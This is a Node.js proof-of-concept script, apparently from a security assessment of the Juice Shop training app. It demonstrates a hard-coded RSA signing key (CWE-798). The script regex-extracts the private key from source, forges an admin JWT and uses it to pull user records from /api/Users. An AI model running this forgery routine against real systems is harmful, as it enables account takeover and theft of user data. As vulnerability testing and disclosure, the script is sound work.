#!/usr/bin/env node
/*
 * V5 - Hard-coded RSA private key in version control (CWE-798 / CWE-321,
 *      OWASP A02:2021 Cryptographic Failures)
 *
 * lib/insecurity.ts contained the RSA private key used to sign every session
 * JWT as a string literal, committed to the repository:
 *
 *   const privateKey = '...a PEM-encoded RSA private key, committed as a\n *                          string literal...'
 *
 * Anyone with read access to the source - a contractor, a leaked backup, a
 * public mirror - can therefore mint a perfectly valid token for any account,
 * including the administrator, without ever guessing a password.
 *
 * This PoC does exactly that: it recovers the key from the source tree, signs
 * an administrator token with node:crypto (no third-party dependency) and uses
 * it against an authenticated endpoint.
 *
 * Run:  node poc/05-hardcoded-key-jwt-forgery.mjs --url http://localhost:3000 \
 *             --baseline ../app/lib/insecurity.ts
 */

import fs from 'node:fs'
import path from 'node:path'
import crypto from 'node:crypto'
import { ARGS, request, verdict } from './lib/util.mjs'

const evidence = []
const baseline = path.resolve(process.cwd(), ARGS.baseline)

console.log(`\n[*] Target             : ${ARGS.url}`)
console.log(`[*] Source inspected   : ${baseline}`)

// ---------------------------------------------------------------------------
// 1. Recover the signing key from the source tree.
// ---------------------------------------------------------------------------
let privateKeyPem = null
if (fs.existsSync(baseline)) {
  const source = fs.readFileSync(baseline, 'utf8')
  const match = source.match(/const privateKey = '((?:[^'\\]|\\.)*)'/)
  if (match) {
    privateKeyPem = match[1].replace(/\\r\\n/g, '\r\n').replace(/\\n/g, '\n')
  }
} else {
  console.log(`[!] Baseline source not found - treating the key as absent.`)
}

if (!privateKeyPem) {
  evidence.push(`No hard-coded private key found in ${path.basename(baseline)}`)
  evidence.push('The key is injected at runtime; there is nothing to steal from the repository.')
  const unauth = await request('/api/Users')
  evidence.push(`GET /api/Users with no credentials -> HTTP ${unauth.status}`)
  verdict({
    id: 'V5',
    title: 'Hard-coded RSA private key - admin token forgery',
    cwe: 'CWE-798',
    exploited: false,
    evidence
  })
}

evidence.push(`Recovered key from source : ${privateKeyPem.split('\n')[0]} ... (${privateKeyPem.length} chars)`)

// ---------------------------------------------------------------------------
// 2. Forge an administrator token (RS256, signed with the stolen key).
// ---------------------------------------------------------------------------
function b64url (input) {
  return Buffer.from(input).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
}

const header = b64url(JSON.stringify({ typ: 'JWT', alg: 'RS256' }))
const payload = b64url(JSON.stringify({
  data: { id: 1, username: '', email: 'admin@juice-sh.op', role: 'admin' },
  bid: 1,
  iat: Math.floor(Date.now() / 1000)
}))
const signer = crypto.createSign('RSA-SHA256')
signer.update(`${header}.${payload}`)
const signature = signer.sign(privateKeyPem, 'base64')
  .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
const forgedToken = `${header}.${payload}.${signature}`

evidence.push(`Forged token (no login performed): ${forgedToken.slice(0, 48)}...`)

// ---------------------------------------------------------------------------
// 3. Use it.
// ---------------------------------------------------------------------------
const anonymous = await request('/api/Users')
const forged = await request('/api/Users', { headers: { Authorization: `Bearer ${forgedToken}` } })
const leaked = forged.json?.data?.length ?? 0

evidence.push(`GET /api/Users  (no token)     -> HTTP ${anonymous.status}`)
evidence.push(`GET /api/Users  (forged token) -> HTTP ${forged.status}, ${leaked} user records returned`)
if (leaked > 0) {
  evidence.push(`   - first record: ${JSON.stringify(forged.json.data[0]).slice(0, 110)}`)
}

const exploited = forged.status === 200 && leaked > 0

verdict({
  id: 'V5',
  title: 'Hard-coded RSA private key - admin token forgery',
  cwe: 'CWE-798',
  exploited,
  evidence
})
